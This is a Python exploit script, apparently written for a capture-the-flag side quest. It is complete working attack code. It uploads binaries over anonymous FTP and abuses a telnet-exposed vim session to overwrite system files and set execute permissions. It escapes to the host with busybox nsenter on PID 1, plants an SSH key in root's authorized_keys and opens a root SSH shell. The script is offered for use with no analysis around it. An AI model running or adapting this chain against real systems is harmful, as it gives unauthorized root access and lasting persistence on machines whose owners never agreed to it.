#!/usr/bin/env python
# Sidequest4 exploit script
from warnings import filterwarnings
filterwarnings("ignore")
import argparse
import paramiko
import telnetlib
import time
import os
import sys
import subprocess
from termcolor import colored
from ftplib import FTP


def isAlive(address):
    try:
        subprocess.check_output(['ping', '-c', '1', address])
        return True
    except subprocess.CalledProcessError:
        return False

def stylePrint(s):
    for c in s:
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.01)
        
def print_dangerous(message):
    dangerous_icon = colored("[âœ”] ðŸ’€", 'red')  # You can customize the icon
    decorated_message = f"{dangerous_icon} {colored(message, 'red')}"
    print(decorated_message)


def print_statement(setting_name, success=True):
    if success:
        tick_mark = colored("[âœ”]", 'green')
        statement = colored(f"{setting_name}", 'yellow')
        stylePrint(f"{tick_mark} {statement}\n")
    else:
        cross_mark = colored("[âœ–]", 'red')
        statement = colored(f"{setting_name}", 'white')
        stylePrint(f"{cross_mark} {statement}\n")

def sendVimCommand(connection, command):
    try:
        connection.write(command.encode('utf-8') + b'\n')
        time.sleep(1)  # Just to make sure everything works fine
        return 200
    except Exception as e:
        print_statement(f"Error in sendVimCommand Module: {e}")
        return 404

class ScapegoatFiles():
    def __init__(self, address=None, port=None):
        self.address = address
        self.port = port

def uploadBinary(fileList, scapegoat):
    ftpPort = 8075
    ftp = FTP()
    ftp.connect(scapegoat.address, ftpPort)
    ftp.set_pasv(False)
    authStatus = ftp.login()
    toUpload = 3  # Just a counter to keep track of the successful uploads
    try:
        if '230' in authStatus:
            for file in fileList:
                for filePath, fileName in file.items():   # Getting the key, value from the dictionary
                    with open(filePath, 'rb') as f:
                        try:
                            print_statement(f"Uploading\t\t\t: {colored(f'{fileName}', 'white')}",success=True)
                            ftp.storbinary(f'STOR {fileName}', f)
                            toUpload -= 1
                        except Exception as e:
                            print_statement(f"Error in uploadBinary : {e}")
        if toUpload == 0:  # If all files are uploaded successfully, we return 200.
            ftp.close()
            return 200
        else:
            ftp.close()
            return 404
    except Exception as e:
        print_statement(f"Error in uploadBinary module: {e}")
        ftp.close()

def overwriteFiles(scapegoat):
    def overwrite(target, command, address, port):
        try:
            connection = telnetlib.Telnet(address, port)
            response = sendVimCommand(connection, command)
            if response == 404:
                print_statement(f"Error: Overwriting\t\t\t: {colored(f'{target}', 'white')}", success=False)
            else:
                print_statement(f"Overwriting\t\t\t: {colored(f'{target}', 'white')}", success=True)
            connection.close()
        except Exception as e:
            print(f"Error : {e}")

    address = scapegoat.address
    port = scapegoat.port

    fileExploit = {
        "/usr/frosty/sh": ":edit /tmp/ftp/bash | :w! /usr/frosty/sh | :q",
        "/tmp/nano": ":edit /tmp/ftp/chmod | :w! /tmp/nano | :q",
    }
    for everyFile, overwriteCommand in fileExploit.items():
        overwrite(everyFile, overwriteCommand, address, port)

def overwritePermissions(scapegoat):
    try:
        connection = telnetlib.Telnet(scapegoat.address, scapegoat.port)
        command = '/tmp/nano +x /tmp/ftp/busybox'
        response = sendVimCommand(connection, command)
        if response == 404:
            print_statement("Error Changing Permssion", success=False)
            sys.exit(0)
    finally:
        connection.close()

def generateSSHKeys():
    key = paramiko.RSAKey.generate(2048)
    private_key_path = 'id_rsa'
    public_key_path = 'id_rsa.pub'

    with open(private_key_path, 'w') as private_key_file:
        key.write_private_key(private_key_file)

    with open(public_key_path, 'w') as public_key_file:
        public_key_file.write(f"{key.get_name()} {key.get_base64()}\n")

    os.system('chmod 600 id_rsa')
    return 200

def main(address):
    fileList = [
        {
            './binaries/bash': 'bash',
            './binaries/chmod': 'chmod',
            './binaries/busybox': 'busybox',
        }
    ]
    scapeGoating = ScapegoatFiles(address=address, port=8085)
    # Upload the files first
    
    print_statement(f"Uploading Files\t\t: {colored(f'{address}', 'yellow')} / {colored(f'{scapeGoating.port}', 'green')}")
    status = uploadBinary(fileList, scapeGoating)
    if status == 200:
        print_statement("Uploading Success ðŸ¥‚ðŸŽ‰ðŸ¥³", success=True)
    else:
        print_statement("[ðŸ˜­]Failed to upload binaries", success=False)
        return -1
    # Start scapegoating the binaries
    scapeGoating.port = 8065
    print("\n")
    print_statement(f"Overwriting Files\t\t: {colored(f'{address}', 'yellow')} / {colored(f'{scapeGoating.port}', 'green')}")
    overwriteFiles(scapeGoating)

    # Change the permissions of the binaries
    scapeGoating.port = 8065
    overwritePermissions(scapeGoating)
    print("\n")

def checkSSHKeys():
    private="id_rsa"
    public="id_rsa.pub"
    currentDirectory=os.getcwd()
    privateExist = os.path.join(currentDirectory, private)
    publicExist = os.path.join(currentDirectory, public)
    if (os.path.isfile(privateExist) and os.path.isfile(publicExist)):
        return True
    else:
        return False

def getShell(address):
    connection= telnetlib.Telnet(address, 8065)
    escalatePrivs={
        "Hijacking PID 1":"/tmp/ftp/busybox nsenter --target 1 --mount --uts --ipc --net --pid -- bash",
        "SSH In Root":"mkdir /root/.ssh"
    }
    def overwriteSSH():
        with open('id_rsa.pub', 'r') as f:
            content = f.read()
        try:
            command = f'echo "{content}" > /root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys'
            response = sendVimCommand(connection, command)
            if response == 404:
                print_statement(f"Error Writing SSH Key",success=False)
        except Exception as e:
            print_statement(f"Error Sending Public Key to Traget : {e}")
    
    
    for escalate,escalateCommand in escalatePrivs.items():
        response = sendVimCommand(connection, escalateCommand)
        if response == 404:
            print_statement(f"Error Escalating : {escalate}",success=False)
            return
        else:
            print_statement(f"Escalating\t\t\t: {colored(f'{escalate}', 'white')}",success=True)
    if not checkSSHKeys():
        generateSSHKeys()
        overwriteSSH()
    else:
        overwriteSSH()
    print("\n")


def connectSSH(address):
    os.system(f'ssh -i id_rsa -q -o StrictHostKeyChecking=no root@{address}')
    print(colored("ðŸ‘‹ Bye!", 'blue'))
    sys.exit(0)

def cleanup():
    try:
        os.remove("id_rsa")
        os.remove("id_rsa.pub")
    except Exception as e:
        print_statement(f"Error Cleaning Up : {e}")

if __name__ == '__main__':
    try:
        parser = argparse.ArgumentParser(description='Sidequest 3 pwn script')
        parser.add_argument("--address", "-a", dest="address", required=True, help="Server IP Address")
        args = parser.parse_args()
        address = args.address
        if isAlive(address):
            print(f"\n")
            print_dangerous(f"Hacking into Server\t: {colored(f'{address}','white')}")
            main(address)
            print_statement(f"Escalating Privileges\t: {colored(f'{address}', 'yellow')} / {colored(f'{8065}', 'green')}")
            getShell(address)
            stylePrint(colored("[âœ”] ðŸ“¡ Ready for the connection!\n", 'cyan'))
            print_dangerous("Executing SSH Shell")
            time.sleep(3)
            connectSSH(address)
            cleanup()
            sys.exit(0)
        else:
            cleanup()
            print_statement("Host Down",success=False)
            sys.exit(0)
    except Exception as e:
        print(f"Error : {e}")
        print(colored("ðŸ‘‹ Bye!", 'blue'))
        cleanup()
        sys.exit(0)
    except KeyboardInterrupt:
        print(colored("ðŸ‘‹ Bye!", 'blue'))
        cleanup()
        sys.exit(0)
